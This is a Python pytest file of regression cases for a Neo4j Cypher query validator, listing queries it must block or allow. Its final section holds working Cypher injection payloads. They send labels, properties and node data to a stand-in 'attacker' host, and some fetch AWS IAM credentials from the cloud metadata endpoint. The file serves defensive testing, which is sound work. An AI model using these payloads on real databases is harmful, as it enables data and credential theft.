"""Shared query validator regression cases."""

import pytest

DANGEROUS_READ_PATH_FUZZ_CASES = [
    pytest.param("LOAD\u00a0CSV FROM 'http://127.0.0.1:1/' AS row RETURN row", id="load-nbsp"),
    pytest.param("LOAD\fCSV FROM 'http://127.0.0.1:1/' AS row RETURN row", id="load-formfeed"),
    pytest.param("LOAD // comment\n CSV FROM 'http://127.0.0.1:1/' AS row RETURN row", id="load-line-comment"),
    pytest.param(r"LO\u0041D/*x*/CSV FROM 'http://127.0.0.1:1/' AS row RETURN row", id="load-unicode-comment"),
    pytest.param("SHOW\u00a0ALL INDEXES YIELD name RETURN name LIMIT 1", id="show-nbsp-modifier"),
    pytest.param("SHOW // comment\n INDEXES YIELD name RETURN name LIMIT 1", id="show-line-comment"),
    pytest.param(r"SH\u004fW /*x*/ CONSTRAINTS YIELD name RETURN name LIMIT 1", id="show-unicode-comment"),
    pytest.param("CALL\u00a0apoc.help('text') YIELD name RETURN name LIMIT 1", id="call-apoc-nbsp"),
    pytest.param("CALL `apoc`.`load`.`json`('http://127.0.0.1:1/') YIELD value RETURN value", id="call-apoc-quoted"),
    pytest.param(r"C\u0041LL /*x*/ apoc.help('text') YIELD name RETURN name LIMIT 1", id="call-apoc-unicode"),
    pytest.param("CALL `gds`.`list`() YIELD name RETURN name LIMIT 1", id="call-gds-quoted"),
    pytest.param(r"CALL g\u0064s.list() YIELD name RETURN name LIMIT 1", id="call-gds-unicode"),
    pytest.param(
        "RETURN `apoc`.`cypher`.`runFirstColumnSingle`('RETURN 1', {}) AS r",
        id="apoc-cypher-segment-quoted",
    ),
    pytest.param(
        "RETURN apoc/*x*/.cypher.runFirstColumnSingle('RETURN 1', {}) AS r",
        id="apoc-cypher-comment-before-dot",
    ),
    pytest.param(
        "RETURN apoc./*x*/cypher.runFirstColumnSingle('RETURN 1', {}) AS r",
        id="apoc-cypher-comment-after-dot",
    ),
    pytest.param(
        "RETURN `apoc`/*x*/./*y*/`cypher`.`runFirstColumnSingle`('RETURN 1', {}) AS r",
        id="apoc-cypher-quoted-comments",
    ),
    pytest.param(r"RETURN apoc.cyph\u0065r.runFirstColumnSingle('RETURN 1', {}) AS r", id="apoc-cypher-unicode"),
    pytest.param("RETURN gds.version() AS version", id="gds-function"),
    pytest.param("RETURN `gds`.`version`() AS version", id="gds-function-quoted"),
    pytest.param(
        "MATCH (s)-[r]->(t) WITH `gds`.`graph`.`project`('probe', s, t) AS graph RETURN graph",
        id="gds-project-quoted",
    ),
    pytest.param(
        "MATCH (s)-[r]->(t) WITH gds/*x*/.graph.project('probe', s, t) AS graph RETURN graph",
        id="gds-comment-dot",
    ),
    pytest.param(
        "RETURN ai.text.chunkByTokenLimit(n.description, 512, 'text-embedding-3-small', 32) AS chunks",
        id="ai-text-chunk-function",
    ),
    pytest.param(
        "RETURN `ai`.`text`.`tokenCount`('sensitive text', 'OpenAI', {}) AS tokens",
        id="ai-text-token-count-quoted",
    ),
    pytest.param(
        "CALL ai/*x*/.text.embedBatch(['secret'], 'OpenAI', {}) YIELD index, vector RETURN index, vector",
        id="ai-text-procedure-comment-dot",
    ),
    pytest.param(
        "RETURN ai./*x*/text.tokenCount('sensitive text', 'OpenAI', {}) AS tokens",
        id="ai-text-comment-after-dot",
    ),
    pytest.param(
        r"RETURN a\u0069.text.tokenCount('sensitive text', 'OpenAI', {}) AS tokens",
        id="ai-text-unicode-namespace",
    ),
    pytest.param(
        "CALL `ai.text.tokenCount.providers`() YIELD name RETURN name",
        id="ai-text-full-quoted-procedure",
    ),
    pytest.param(
        "RETURN `ai.text.completion`('summarize this', 'OpenAI', {}) AS response",
        id="ai-text-full-quoted",
    ),
    pytest.param(
        "RETURN genai.vector.encode('secret', 'OpenAI', {}) AS embedding",
        id="genai-vector-function",
    ),
    pytest.param(
        "CALL `genai`.`vector`.`encodeBatch`(['secret'], 'OpenAI', {}) YIELD index, vector RETURN index, vector",
        id="genai-vector-procedure-quoted",
    ),
    pytest.param(
        "RETURN genai/*x*/.vector.encode('secret', 'OpenAI', {}) AS embedding",
        id="genai-vector-comment-before-dot",
    ),
    pytest.param(
        "RETURN genai./*x*/vector.encode('secret', 'OpenAI', {}) AS embedding",
        id="genai-vector-comment-after-dot",
    ),
    pytest.param(
        r"RETURN gena\u0069.vector.encode('secret', 'OpenAI', {}) AS embedding",
        id="genai-vector-unicode-namespace",
    ),
    pytest.param(
        "RETURN `genai.vector.encode`('secret', 'OpenAI', {}) AS embedding",
        id="genai-vector-full-quoted",
    ),
]

WRITE_QUERY_TYPE_FUZZ_CASES = [
    pytest.param("rw", "CYPHER 25 CREATE (:SeizuWriteProbe {id: 'x'})", id="cypher25-create"),
    pytest.param("rw", "CYPHER 25 FOR x IN [1,2] CREATE (:SeizuWriteProbe {id: x})", id="cypher25-for-create"),
    pytest.param(
        "rw",
        "CYPHER 25 FOR x IN [1,2] RETURN x NEXT CREATE (:SeizuWriteProbe {id: x})",
        id="cypher25-for-next-create",
    ),
    pytest.param(
        "rw",
        "CYPHER 25 WHEN true THEN CREATE (:SeizuWriteProbe {id: 'when'}) RETURN 1 AS n ELSE RETURN 2 AS n",
        id="cypher25-when-create",
    ),
    pytest.param(
        "rw",
        "CYPHER 25 RETURN 1 AS n NEXT RETURN n UNION CREATE (:SeizuWriteProbe {id: 'union'}) RETURN 2 AS n",
        id="cypher25-next-union-create",
    ),
    pytest.param("rw", "INSERT (:SeizuWriteProbe {id: 'x'})", id="insert"),
    pytest.param("w", "MATCH (n) NODETACH DELETE n", id="nodetach-delete"),
    pytest.param("rw", "CALL { CREATE (:SeizuWriteProbe {id: 'sub'}) } RETURN 1", id="call-subquery-create"),
    pytest.param(
        "rw",
        "UNWIND [1] AS x CALL { WITH x CREATE (:SeizuWriteProbe {id: x}) } IN TRANSACTIONS RETURN x",
        id="call-in-transactions-create",
    ),
    pytest.param(
        "rw",
        "MATCH (n) WITH n LIMIT 1 OPTIONAL CALL { WITH n CREATE (:SeizuWriteProbe) RETURN n AS m } RETURN m",
        id="optional-call-create",
    ),
    pytest.param(
        "rw",
        "MATCH (n) WITH n LIMIT 1 CALL (n) { CREATE (n)-[:SEIZU_SCOPE_PROBE]->(:SeizuWriteProbe) } RETURN n",
        id="scoped-call-create",
    ),
    pytest.param("rw", "CALL { CALL { CREATE (:SeizuWriteProbe) } RETURN 1 AS x } RETURN x", id="nested-call-create"),
    pytest.param(
        "rw",
        "MATCH (n) RETURN count(n) AS c UNION CREATE (:SeizuWriteProbe) RETURN 1 AS c",
        id="union-create",
    ),
    pytest.param("s", "CREATE INDEX seizu_probe IF NOT EXISTS FOR (n:SeizuWriteProbe) ON (n.id)", id="schema-index"),
    pytest.param("w", "CALL db.createLabel('SeizuProbe')", id="builtin-write-procedure"),
]

READ_ONLY_CALL_SUBQUERY_CASES = [
    pytest.param("CYPHER 25 FOR x IN [1,2] RETURN x", id="cypher25-for-read"),
    pytest.param("CYPHER 25 UNWIND [1, 2] AS n LET doubled = n * 2 RETURN doubled", id="cypher25-let-read"),
    pytest.param("CYPHER 25 RETURN 1 AS n NEXT RETURN n + 1 AS n", id="cypher25-next-read"),
    pytest.param("CYPHER 25 WHEN true THEN RETURN 1 AS n ELSE RETURN 2 AS n", id="cypher25-when-read"),
    pytest.param("CALL { MATCH (n) RETURN count(n) AS c } RETURN c", id="returning-read-subquery"),
    pytest.param("CALL { CALL { RETURN 1 AS x } RETURN x } RETURN x", id="nested-read-subquery"),
    pytest.param(
        "CALL { MATCH (n) RETURN count(n) AS c UNION MATCH ()-[r]->() RETURN count(r) AS c } RETURN sum(c)",
        id="union-read-subquery",
    ),
    pytest.param(
        "MATCH (n) WITH n LIMIT 1 CALL (n) { RETURN labels(n) AS labels } RETURN labels",
        id="scoped-read-subquery",
    ),
    pytest.param(
        "MATCH (n) WITH n LIMIT 1 OPTIONAL CALL { WITH n MATCH (n)-->(m) RETURN m LIMIT 1 } RETURN m",
        id="optional-read-subquery",
    ),
    pytest.param("UNWIND [1,2] AS x CALL { WITH x RETURN x AS y } IN TRANSACTIONS RETURN y", id="read-in-transactions"),
]

ADMIN_COMMAND_FUZZ_CASES = [
    pytest.param("SHOW CURRENT USER YIELD user RETURN user", id="show-current-user"),
    pytest.param("SHOW ROLES WITH USERS YIELD role, member RETURN role, member LIMIT 5", id="show-roles-with-users"),
    pytest.param("SHOW ALL PRIVILEGES AS COMMANDS YIELD command RETURN command LIMIT 5", id="show-privileges-commands"),
    pytest.param("SHOW ALIASES FOR DATABASE YIELD name RETURN name", id="show-aliases"),
    pytest.param("SHOW // comment\n USERS YIELD user RETURN user LIMIT 1", id="show-line-comment-users"),
    pytest.param(r"SH\u004fW PRIVILEGES YIELD action RETURN action LIMIT 1", id="show-unicode-privileges"),
    pytest.param(
        "TERMINATE\u00a0TRANSACTION 'neo4j-transaction-0' YIELD transactionId RETURN transactionId",
        id="terminate-nbsp",
    ),
    pytest.param("CREATE DATABASE seizu_probe IF NOT EXISTS", id="create-database"),
    pytest.param("CREATE OR REPLACE DATABASE seizu_probe", id="create-or-replace-database"),
    pytest.param("DROP DATABASE seizu_probe IF EXISTS", id="drop-database"),
    pytest.param("ALTER DATABASE neo4j SET ACCESS READ ONLY", id="alter-database"),
    pytest.param("START /*x*/ DATABASE neo4j", id="start-database-comment"),
    pytest.param(r"ST\u004fP DATABASE neo4j", id="stop-database-unicode"),
    pytest.param("CREATE ALIAS seizu_alias IF NOT EXISTS FOR DATABASE neo4j", id="create-alias"),
    pytest.param(
        "CREATE ALIAS seizu_remote IF NOT EXISTS FOR DATABASE neo4j "
        "AT 'neo4j://127.0.0.1:7687' USER neo4j PASSWORD 'password'",
        id="create-remote-alias",
    ),
    pytest.param("CREATE USER seizu_probe IF NOT EXISTS SET PASSWORD 'password' CHANGE NOT REQUIRED", id="create-user"),
    pytest.param("ALTER CURRENT USER SET PASSWORD FROM 'password' TO 'password2'", id="alter-current-user"),
    pytest.param("RENAME USER seizu_probe TO seizu_probe2", id="rename-user"),
    pytest.param("CREATE ROLE seizu_probe_role IF NOT EXISTS AS COPY OF reader", id="create-role-copy"),
    pytest.param("GRANT ROLE reader TO seizu_probe", id="grant-role"),
    pytest.param("GRANT IMMUTABLE ACCESS ON DATABASE neo4j TO reader", id="grant-immutable"),
    pytest.param("DENY EXECUTE FUNCTION * ON DBMS TO reader", id="deny-execute-function"),
    pytest.param("REVOKE CREATE USER ON DBMS FROM reader", id="revoke-dbms-privilege"),
    pytest.param("ENABLE SERVER 'server-id'", id="enable-server"),
    pytest.param("DEALLOCATE DATABASES FROM SERVER 'server-id'", id="deallocate-databases"),
    pytest.param("CREATE COMPOSITE DATABASE seizu_composite IF NOT EXISTS", id="create-composite-database"),
    pytest.param(
        "ALTER CURRENT GRAPH TYPE SET { (:Person => {name :: STRING IS KEY}) }",
        id="alter-current-graph-type-set",
    ),
    pytest.param(
        "ALTER CURRENT GRAPH TYPE ADD { (:Company => {name :: STRING IS UNIQUE}) }",
        id="alter-current-graph-type-add",
    ),
    pytest.param(
        "ALTER /*x*/ CURRENT GRAPH TYPE ADD { (:Pet => {name :: STRING}) }",
        id="alter-current-graph-type-comment",
    ),
    pytest.param(
        r"ALTER CURRENT GR\u0041PH TYPE ADD { (:Pet => {name :: STRING}) }",
        id="alter-current-graph-type-unicode",
    ),
    pytest.param(
        "ALTER CURRENT\u00a0GRAPH TYPE ADD { (:Pet => {name :: STRING}) }",
        id="alter-current-graph-type-nbsp",
    ),
    pytest.param(
        "USE system CREATE USER seizu_probe IF NOT EXISTS SET PASSWORD 'password' CHANGE NOT REQUIRED",
        id="use-system-create-user",
    ),
    pytest.param("CALL dbms.listConfig() YIELD name, value RETURN name, value LIMIT 5", id="dbms-list-config"),
    pytest.param(
        "CALL dbms.killConnection('bogus') YIELD connectionId, message RETURN connectionId, message",
        id="dbms-kill-connection",
    ),
    pytest.param("CALL db.clearQueryCaches() YIELD value RETURN value", id="db-clear-query-caches"),
    pytest.param("CALL tx.setMetaData({seizu_probe: true})", id="tx-set-metadata"),
]

# USE clause variants that escape Seizu's configured graph. All are blocked
# regardless of EXPLAIN classification.
USE_CLAUSE_FUZZ_CASES = [
    pytest.param("USE system MATCH (n) RETURN n", id="use-system"),
    pytest.param("USE otherdb MATCH (n) RETURN n", id="use-other-database"),
    pytest.param("USE myComposite.myConstituent MATCH (n) RETURN n", id="use-composite-constituent"),
    pytest.param("USE graph.byName('system') MATCH (n) RETURN n", id="use-graph-by-name-literal"),
    pytest.param("USE graph.byName($db) MATCH (n) RETURN n", id="use-graph-by-name-param"),
    pytest.param("USE graph.byElementId($id) MATCH (n) RETURN n", id="use-graph-by-element-id"),
    pytest.param("USE `my-other-db` MATCH (n) RETURN n", id="use-backtick-database"),
    pytest.param("CYPHER 25 USE otherdb MATCH (n) RETURN n", id="use-after-cypher-version"),
    pytest.param("USE /* hide */ otherdb MATCH (n) RETURN n", id="use-block-comment"),
    pytest.param(r"\u0055SE otherdb MATCH (n) RETURN n", id="use-unicode-keyword"),
    pytest.param(
        "MATCH (n) RETURN count(n) AS c UNION USE otherdb MATCH (m) RETURN count(m) AS c",
        id="use-after-union",
    ),
    pytest.param("CALL { USE otherdb MATCH (n) RETURN n } RETURN n", id="use-in-subquery"),
    pytest.param("CALL { WITH seed USE otherdb MATCH (n) RETURN n } RETURN n", id="use-in-subquery-after-with"),
    pytest.param(
        "MATCH (n) CALL { WITH * USE otherdb MATCH (m) RETURN m } RETURN m",
        id="use-in-subquery-after-with-star",
    ),
    pytest.param(
        "CYPHER 25 RETURN 1 AS x NEXT USE otherdb MATCH (n) RETURN n",
        id="use-after-next",
    ),
    pytest.param(
        "CYPHER 25 WHEN true THEN USE otherdb MATCH (n) RETURN n ELSE RETURN null AS n",
        id="use-after-then",
    ),
    pytest.param(
        "CYPHER 25 WHEN false THEN RETURN null AS n ELSE USE otherdb MATCH (n) RETURN n",
        id="use-after-else",
    ),
    pytest.param(
        "CYPHER 25 WHEN true THEN USE else MATCH (n) RETURN n ELSE RETURN null AS n",
        id="use-after-then-database-named-else",
    ),
    pytest.param(
        "CYPHER 25 WHEN true THEN USE end MATCH (n) RETURN n ELSE RETURN null AS n",
        id="use-after-then-database-named-end",
    ),
    pytest.param("CYPHER 25 USE otherdb FOR x IN [1, 2] RETURN x", id="use-followed-by-for"),
    pytest.param("CYPHER 25 USE otherdb LET x = 1 RETURN x", id="use-followed-by-let"),
    pytest.param(
        "CYPHER 25 USE otherdb WHEN true THEN RETURN 1 AS n ELSE RETURN 2 AS n",
        id="use-followed-by-when",
    ),
    pytest.param(
        "USE otherdb OPTIONAL CALL { RETURN 1 AS n } RETURN n",
        id="use-followed-by-optional-call",
    ),
    pytest.param(
        "CYPHER 25 RETURN 1 AS x NEXT USE otherdb FOR y IN [1] RETURN y",
        id="use-after-next-followed-by-for",
    ),
]

# Legitimate read-only queries that place a variable named `use` right after a
# CASE THEN/ELSE keyword. The USE-clause guard anchors on THEN/ELSE (Cypher 25
# conditional branches), so these must not be misread as a USE clause.
USE_CLAUSE_FALSE_POSITIVE_CASES = [
    pytest.param(
        "WITH 1 AS use, 2 AS alt RETURN CASE WHEN use > 0 THEN use ELSE alt END AS v",
        id="case-then-use-variable",
    ),
    pytest.param(
        "WITH 1 AS use RETURN CASE WHEN false THEN 0 ELSE use END AS v",
        id="case-else-use-variable",
    ),
    pytest.param(
        "WITH 1 AS use RETURN CASE 1 WHEN 1 THEN use ELSE 0 END AS v",
        id="simple-case-then-use-variable",
    ),
    pytest.param(
        "WITH 1 AS use, 2 AS alt RETURN CASE WHEN use > 0 THEN use + alt ELSE alt END AS v",
        id="case-then-use-variable-expression",
    ),
    pytest.param(
        "WITH 1 AS use RETURN CASE WHEN false THEN 0 ELSE use * 2 END AS v",
        id="case-else-use-variable-expression",
    ),
]

# Procedure calls blocked by default — the allowlist only covers side-effect-free
# built-in schema procedures.
DISALLOWED_PROCEDURE_CASES = [
    pytest.param("CALL apoc.load.json('http://169.254.169.254/') YIELD value RETURN value", id="apoc-load-json"),
    pytest.param("CALL apoc.coll.sum([1, 2, 3]) YIELD value RETURN value", id="apoc-coll-sum"),
    pytest.param("CALL gds.graph.list() YIELD graphName RETURN graphName", id="gds-graph-list"),
    pytest.param(
        "CALL n10s.rdf.import.fetch('http://attacker/', 'Turtle') YIELD terminationStatus RETURN terminationStatus",
        id="neosemantics-rdf-import-fetch",
    ),
    pytest.param("CALL dbms.listConfig() YIELD name RETURN name", id="dbms-list-config-proc"),
    pytest.param(
        "CALL db.index.fulltext.queryNodes('idx', 'term') YIELD node RETURN node",
        id="db-index-fulltext-query",
    ),
    pytest.param(
        "CALL `apoc`.`load`.`json`('http://attacker/') YIELD value RETURN value",
        id="apoc-load-json-quoted",
    ),
    pytest.param(r"C\u0041LL apoc.help('text') YIELD name RETURN name", id="apoc-help-unicode-call"),
    pytest.param(
        "MATCH (n) CALL custom.exfil(n) YIELD result RETURN result LIMIT 1",
        id="embedded-custom-procedure",
    ),
]

# Procedure calls permitted by default — side-effect-free built-in schema
# introspection procedures.
ALLOWED_PROCEDURE_CASES = [
    pytest.param("CALL db.labels() YIELD label RETURN label ORDER BY label", id="db-labels"),
    pytest.param("CALL db.relationshipTypes() YIELD relationshipType RETURN relationshipType", id="db-rel-types"),
    pytest.param("CALL db.propertyKeys() YIELD propertyKey RETURN propertyKey", id="db-property-keys"),
    pytest.param("CALL db.schema.visualization()", id="db-schema-visualization"),
    pytest.param(
        "CALL db.schema.nodeTypeProperties() YIELD nodeType, propertyName RETURN nodeType, propertyName",
        id="db-schema-node-type-properties",
    ),
    pytest.param(
        "MATCH (n) CALL db.labels() YIELD label RETURN n, label LIMIT 1",
        id="embedded-allowed-procedure",
    ),
]

LIVE_READ_ONLY_QUERIES = [
    pytest.param("MATCH (n) RETURN n LIMIT 1", id="match-limit"),
    pytest.param("OPTIONAL MATCH (n)-[r]->(m) RETURN n, r, m LIMIT 1", id="optional-match"),
    pytest.param("UNWIND [1, 2, 3] AS x RETURN x", id="unwind"),
    pytest.param("MATCH (n) WHERE n.name = $name RETURN n LIMIT 1", id="params"),
]

CYPHER_25_BLOCKED_EXTRA_QUERIES = [
    pytest.param("CYPHER 25 FOR x IN [1,2] CREATE (:SeizuLiveValidatorProbe {id: x})", id="cypher25-for-create"),
    pytest.param(
        "CYPHER 25 FOR x IN [1,2] RETURN x NEXT CREATE (:SeizuLiveValidatorProbe {id: x})",
        id="cypher25-next-create",
    ),
    pytest.param(
        "CYPHER 25 WHEN true THEN CREATE (:SeizuLiveValidatorProbe {id: 'when'}) RETURN 1 AS x ELSE RETURN 2 AS x",
        id="cypher25-when-create",
    ),
    pytest.param("CYPHER 25 RETURN ai.text.tokenCount('secret', 'OpenAI', {}) AS tokens", id="cypher25-ai-text"),
    pytest.param(
        "CYPHER 25 RETURN `genai`.`vector`.`encode`('secret', 'OpenAI', {}) AS embedding",
        id="cypher25-genai-vector-quoted",
    ),
    pytest.param(
        "CYPHER 25 ALTER CURRENT GRAPH TYPE ADD { (:Company => {name :: STRING IS UNIQUE}) }",
        id="cypher25-alter-graph-type",
    ),
]

NEO4JECTION_BLOCKED_QUERIES = [
    pytest.param(
        "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label LOAD CSV FROM 'http://attacker/' as l RETURN 1 //",
        id="neo4jection-or-true-load-csv",
    ),
    pytest.param(
        "'=' LOAD CSV FROM 'http://attacker/' as l WITH 0 as _l00 RETURN 1 //",
        id="neo4jection-property-filter",
    ),
    pytest.param(
        "'}) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //",
        id="neo4jection-union-property",
    ),
    pytest.param(
        "a) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //",
        id="neo4jection-union-label",
    ),
    pytest.param(
        "']}]-( ) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //",
        id="neo4jection-union-relationship",
    ),
    pytest.param(
        "'}) RETURN 0 as _0 UNION CALL db.labels() yield label "
        "LOAD CSV FROM 'http://attacker/?l='+label as l RETURN 0 as _0",
        id="neo4jection-label-exfil",
    ),
    pytest.param(
        "' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p "
        "LOAD CSV FROM 'http://attacker/?'+p+'='+toString(f[p]) as l RETURN 0 as _0 //",
        id="neo4jection-property-exfil",
    ),
    pytest.param(
        "' OR 1=1 WITH 0 as _0 MATCH (n) "
        "LOAD CSV FROM 'http://attacker/?json='+apoc.convert.toJson(n) as l RETURN 0 as _0 //",
        id="neo4jection-json-exfil",
    ),
    pytest.param(
        "' OR 1=1 WITH 1 as a CALL apoc.systemdb.graph() yield nodes "
        "LOAD CSV FROM 'http://attacker/?nodes='+apoc.convert.toJson(nodes) as l RETURN 1 //",
        id="neo4jection-apoc-systemdb",
    ),
    pytest.param(
        "' OR 1=1 WITH apoc.cypher.runFirstColumnMany("
        '"SHOW FUNCTIONS YIELD name RETURN name",{}) as names '
        "UNWIND names AS name LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //",
        id="neo4jection-apoc-cypher-function",
    ),
    pytest.param(
        "LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' "
        "AS roles UNWIND roles AS role "
        "LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role as l RETURN l",
        id="neo4jection-imdsv1",
    ),
    pytest.param(
        'CALL apoc.load.csvParams("http://169.254.169.254/latest/api/token", '
        '{method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},"",{header:FALSE}) yield list '
        "WITH list[0] as token RETURN token",
        id="neo4jection-imdsv2-apoc",
    ),
    pytest.param(
        "\u0027}) RETURN 0 as _0 UNION CALL db.labels() yield label "
        'LOAD CSV FROM "http://attacker/"+label RETURN 0 as _o //',
        id="neo4jection-unicode-quote",
    ),
]
